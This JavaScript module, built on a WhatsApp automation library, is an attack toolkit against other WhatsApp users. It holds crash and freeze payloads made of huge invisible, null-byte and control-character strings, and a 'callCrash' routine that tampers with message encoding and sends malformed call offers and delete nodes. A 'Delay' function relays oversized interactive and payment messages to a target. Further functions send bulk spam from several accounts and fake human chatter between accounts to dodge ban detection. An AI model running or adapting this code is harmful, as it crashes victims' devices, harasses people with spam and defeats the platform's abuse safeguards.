/**
 * Handles critical operations like JID attacks and specialized broadcasts.
 */
import crypto from "crypto";
import { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity, generateWAMessageFromContent } from "@rexxhayanasi/elaina-baileys";

// Advanced Crash Vectors
const crashSystem = {
    heavy: "\u200e".repeat(100000),
    storm: "🔥 XOVALIUM-STORM-V1 🔥\n".repeat(500),
    freeze: "\u0000".repeat(5000),
    device_kill: "ERROR_RECALIBRATING_SYSTEM_KERNEL_VOID"
};

/**
 * Execute a specialized JID attack sequence
 * @param {Object} sock - Baileys socket instance
 * @param {string} jid - Target JID (User or Group)
 * @param {string} type - Attack vector type
 */
export const executeAttack = async (sock, jid, type = 'crash', amount = 10) => {
    console.log(`[ SYSTEM ] Initiating ${type} sequence (x${amount}) on target: ${jid}`);
    
    if (!sock || typeof sock.sendMessage !== 'function') {
        console.error('[ SYSTEM ] Invalid socket provided to executeAttack');
        return { success: false, error: 'Socket kernel mismatch' };
    }

    // Auto-fix JID formatting if only number is provided
    if (!jid.includes('@')) {
        jid = jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    }

    // Safety check for critical system JIDs
    if (jid.includes('status@broadcast')) return { success: false, error: 'Target protected by system kernel' };

    try {
        const iter = parseInt(amount) || 10;

        // Special Handling for Protocol-level Crash
        if (type === 'call-crash') {
            for(let i=0; i<iter; i++) {
                await callCrash(sock, jid, false);
                await new Promise(r => setTimeout(r, 1000));
            }
            return { success: true, target: jid };
        }
        
        if (type === 'delay') {
            for(let i=0; i<Math.ceil(iter/5); i++) { // Delay is already heavy, scale down
                await Delay(sock, jid);
            }
            return { success: true, target: jid };
        }

        // Sample attack payloads (conceptual implementation)
        const payloads = {
            'crash': { 
                text: crashSystem.heavy + "\n" + crashSystem.storm,
                contextInfo: {
                    externalAdReply: {
                        title: "KERNEL EXECUTION ERROR",
                        body: "XOVALIUM_RECON_INITIALIZED",
                        mediaType: 1,
                        thumbnail: Buffer.alloc(0),
                        sourceUrl: "https://xovalium.tech"
                    }
                }
            },
            'freeze': { text: crashSystem.heavy },
            'spam': { text: 'XOVALIUM RECALIBRATION REQUIRED - SYSTEM VOID' }
        };

        const content = payloads[type] || payloads.crash;

        // Sequence of high-load messages
        for (let i = 0; i < iter; i++) {
            await sock.sendMessage(jid, content);
            // Minimal delay to hammer the UI
            await new Promise(resolve => setTimeout(resolve, 300));
        }

        return { success: true, target: jid };
    } catch (err) {
        console.error('[ KERNEL ERROR ] Attack sequence failed:', err);
        return { success: false, error: err.message };
    }
};

/**
 * Perform a contact file promotion blast with multi-sender distribution
 * @param {Array|Object} socks - Baileys socket instance or array of instances
 * @param {Array} contacts - List of contact JIDs
 * @param {string} text - Message to promote
 */
export const promoteToContacts = async (socks, contacts, text) => {
    const activeSocks = Array.isArray(socks) ? socks : [socks];
    if (activeSocks.length === 0) return { success: false, error: 'No active sockets' };

    let successCount = 0;
    const totalContacts = contacts.length;
    const contactsPerSock = Math.ceil(totalContacts / activeSocks.length);

    // Distribute contacts to each socket
    const tasks = activeSocks.map(async (sock, index) => {
        const start = index * contactsPerSock;
        const end = Math.min(start + contactsPerSock, totalContacts);
        const chunk = contacts.slice(start, end);

        if (typeof sock.sendMessage !== 'function') return;

        for (const jid of chunk) {
            try {
                await sock.sendMessage(jid, { text });
                successCount++;
                // Anti-ban delay (staggered)
                await new Promise(resolve => setTimeout(resolve, 2000 + (Math.random() * 1000)));
            } catch (e) {
                console.warn(`[ BLAST ] Socket ${index} failed to transmit to ${jid}`);
            }
        }
    });

    // Run all distribution tasks
    await Promise.all(tasks);
    
    return { success: true, count: successCount };
};

/**
 * Specialized Crash Execution (Shortcut)
 * @param {Object} sock - Baileys socket instance
 * @param {string} jid - Target JID
 */
export const initiateCrash = async (sock, jid) => {
    return await executeAttack(sock, jid, 'crash');
};

/**
 * Advanced Call-Protocol Crash
 * @param {Object} sock - Baileys socket instance
 * @param {string} target - Target JID
 * @param {boolean} isVideo - Whether to include video offer
 */
export async function callCrash(sock, target, isVideo = false) {
    try {
        const devices = (
            await sock.getUSyncDevices([target], false, false)
        ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await sock.assertSessions(devices);

        const cmute = () => {
            const locks = new Map();

            return {
                async mx(key, fn) {
                    while (locks.has(key)) {
                        await locks.get(key);
                    }

                    const lock = Promise.resolve().then(() => fn());
                    locks.set(key, lock);

                    try {
                        const result = await lock;
                        return result;
                    } finally {
                        locks.delete(key);
                    }
                }
            };
        };

        const mute = cmute();

        const appendBufferMarker = (buffer) => {
            const newBuffer = Buffer.alloc(buffer.length + 8);
            buffer.copy(newBuffer);
            newBuffer.fill(1, buffer.length);
            return newBuffer;
        };

        const originalCreateParticipantNodes = sock.createParticipantNodes?.bind(sock);
        const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock);

        sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) {
                return {
                    nodes: [],
                    shouldIncludeDeviceIdentity: false
                };
            }

            const processedMessage = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

            const messagePairs = Array.isArray(processedMessage)
                ? processedMessage
                : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

            const { id: meId, lid: meLid } = sock.authState.creds.me;
            const localUser = meLid ? jidDecode(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(
                messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
                    const { user: targetUser } = jidDecode(jid);
                    const { user: ownUser } = jidDecode(meId);
                    const isOwnUser = targetUser === ownUser || targetUser === localUser;
                    const isSelf = jid === meId || jid === meLid;

                    if (dsmMessage && isOwnUser && !isSelf) {
                        msg = dsmMessage;
                    }

                    const encodedBytes = appendBufferMarker(
                        originalEncodeWAMessage
                            ? originalEncodeWAMessage(msg)
                            : encodeWAMessage(msg)
                    );

                    return mute.mx(jid, async () => {
                        const { type, ciphertext } = await sock.signalRepository.encryptMessage({
                            jid,
                            data: encodedBytes
                        });

                        if (type === 'pkmsg') {
                            shouldIncludeDeviceIdentity = true;
                        }

                        return {
                            tag: 'to',
                            attrs: { jid },
                            content: [{
                                tag: 'enc',
                                attrs: {
                                    v: '2',
                                    type,
                                    ...extraAttrs
                                },
                                content: ciphertext
                            }]
                        };
                    });
                })
            );

            return {
                nodes: nodes.filter(Boolean),
                shouldIncludeDeviceIdentity
            };
        };

        const ckey = crypto.randomBytes(32);
        const exckey = Buffer.concat([ckey, Buffer.alloc(8, 0x01)]);
        const cid = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

        const { nodes: destinations, shouldIncludeDeviceIdentity } =
            await sock.createParticipantNodes(devices, {
                conversation: "call-initiated"
            }, { count: '0' });

        const stan = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": cid,
                    "call-creator": sock.user.id
                },
                content: [
                    {
                        tag: "audio",
                        attrs: {
                            enc: "opus",
                            rate: "16000"
                        }
                    },
                    {
                        tag: "audio",
                        attrs: {
                            enc: "opus",
                            rate: "8000"
                        }
                    },
                    ...(isVideo ? [{
                        tag: 'video',
                        attrs: {
                            enc: 'vp8',
                            dec: 'vp8',
                            orientation: '0',
                            screen_width: '1920',
                            screen_height: '1080',
                            device_orientation: '0'
                        }
                    }] : []),
                    {
                        tag: "net",
                        attrs: {
                            medium: "3"
                        }
                    },
                    {
                        tag: "capability",
                        attrs: { ver: "1" },
                        content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                    },
                    {
                        tag: "encopt",
                        attrs: { keygen: "2" }
                    },
                    {
                        tag: "destination",
                        attrs: {},
                        content: destinations
                    },
                    ...(shouldIncludeDeviceIdentity ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }] : [])
                ].filter(Boolean)
            }]
        };

        const deleteNode = {
            tag: "action",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id,
                type: "set"
            },
            content: [{
                tag: "delete",
                attrs: {
                    for: "true"
                },
                content: [{
                    tag: "item",
                    attrs: {
                        jid: target,
                        t: Math.floor(Date.now() / 1000).toString()
                    }
                }]
            }]
        };

        await sock.sendNode(stan);
        await sock.sendNode(deleteNode);
        console.log(`Delete sent to ${target}`);

    } catch (error) {
        console.error('Error in callCrash:', error);
        throw error;
    }
}

/**
 * Perform account warming up to prevent bans
 * @param {Array} socks - List of active Baileys socket instances
 */
export const accountWarmingUp = async (socks, logFn) => {
    if (socks.length < 2) {
        return { success: false, error: 'At least 2 active sender accounts are required for human-simulated warming up' };
    }

    const humanPhrases = [
        "Halo bro, apa kabar?",
        "Lagi apa nih?",
        "P",
        "Test test",
        "Info dong",
        "Woke siap",
        "Oke aman bro",
        "Siap laksanakan",
        "Wkwkwk ada-ada aja",
        "Mabar gak?",
        "Boleh-boleh",
        "Lagi sibuk gak bre?"
    ];

    logFn(`[ WARM-UP ] Starting cross-account interaction between ${socks.length} accounts...`);

    for (let round = 1; round <= 3; round++) {
        logFn(`[ WARM-UP ] Round ${round} initiated...`);
        
        for (let i = 0; i < socks.length; i++) {
            const sender = socks[i];
            // Pick a random recipient from other socks
            const recipients = socks.filter((_, idx) => idx !== i);
            const targetSock = recipients[Math.floor(Math.random() * recipients.length)];
            const targetJid = targetSock.user.id.split(':')[0] + '@s.whatsapp.net';
            const phrase = humanPhrases[Math.floor(Math.random() * humanPhrases.length)];

            try {
                await sender.sendMessage(targetJid, { text: phrase });
                logFn(`[ WARM-UP ] ${sender.user.id.split(':')[0]} -> ${targetJid.split('@')[0]}: "${phrase}"`);
                
                // Human-like typing delay
                await new Promise(r => setTimeout(r, 3000 + (Math.random() * 5000)));
            } catch (err) {
                logFn(`[ WARM-UP ] ERROR: Interaction failed for one session`);
            }
        }
    }

    logFn(`[ WARM-UP ] Sequence completed. Accounts trust score improved.`);
    return { success: true };
};

/**
 * Dynamically added function: Delay
 */
export async function Delay(sock, jid) {
  const pc = false;

  const fakeJid = "120363422445860082@g.us";

  let msg4 = {
    stanzaId: sock.generateMessageTag(),
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: 999e+999 * Date.now()
      }
    },
    businessMessageForwardInfo: {
      businessOwnerJid: "0@s.whatsapp.net"
    },
    nativeFlowMessage: {
      messageParamsJson: "{",
      buttons: [
        {
          name: "review_and_pay",
          buttonParamsJson: JSON.stringify({
            currency: "USD",
            payment_configuration: "",
            payment_type: "",
            total_amount: { value: 999999999, offset: 100 },
            reference_id: "4SWMDTS1PY4",
            type: "physical-goods",
            order: {
              status: "payment_requested",
              description: "",
              subtotal: { value: 0, offset: 100 },
              order_type: "PAYMENT_REQUEST",
              items: [
                {
                  retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                  name: "X",
                  amount: { value: 999999999, offset: 100 },
                  quantity: 1
                }
              ]
            },
            additional_note: ` + ${"\u0000".repeat(10000)} + `, // Reduced size to avoid node memory limit
            native_payment_methods: [],
            share_payment_status: true
          })
        }
      ]
    },
    annotations: [
      {
        embeddedContent: {
          embeddedMessage: {
            message: "─┃► #Killertzy - Explore# 🩸"
          }
        },
        location: {
          degreesLongitude: 0,
          degreesLatitude: 0,
          name: "──+."
        },
        polygonVertices: [
          { x: 60.71664810180664, y: -36.39784622192383 },
          { x: -16.710189819335938, y: 49.263675689697266 },
          { x: -56.585853576660156, y: 37.85963439941406 },
          { x: 20.840980529785156, y: -47.80188751220703 }
        ],
        newsletter: {
          newsletterJid: "1@newsletter",
          newsletterName: "──all.",
          contentType: "UPDATE",
          accessibilityText: "https://KillerTzy/"
        }
      }
    ]
  };

  let msg1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: fakeJid,
            mentionedJid: [jid],
            isForwarded: true,
            fromMe: false,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363422445860082@newsletter",
              serverMessageId: 1,
              newsletterName: "┃► #Killertzy - Explore# 🩸"
            }
          },
          body: {
            text: "┃► #Killertzy - Explore# 🩸",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(100000), 
            version: 3
          }
        }
      }
    }
  };

  // Prepare with generateWAMessageFromContent to ensure proper metadata/keys
  const prep1 = await generateWAMessageFromContent(jid, msg1, {});
  const prep4 = await generateWAMessageFromContent(jid, msg4, {});

  let msg2 = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "SYSTEM_RECALIBRATION",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: JSON.stringify({
                values: {
                  in_pin_code: "7205",
                  building_name: "void_motel",
                  address: "2.7205",
                  tower_number: "507",
                  city: "Batavia",
                  name: "Otax?",
                  phone_number: "+13135550202",
                  house_number: "7205826",
                  floor_number: "16",
                  state: "\x10".repeat(100000)
                }
              }),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  let msg3 = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: "┃► #Killertzy - Explore# 🩸 impossible ",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({
                flow_cta: "\u0000".repeat(100000),
                flow_message_version: "3"
              }),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  const messages = [prep1, msg2, msg3, prep4];

  for (let kil = 0; kil < 2; kil++) {
    for (const msg of messages) {
      try {
        await sock.relayMessage(
          jid,
          msg.message,
          { messageId: msg.key.id }
        );
      } catch (e) {
        console.error(`[ DELAY ] Relay failure:`, e.message);
      }
    }
  }
}
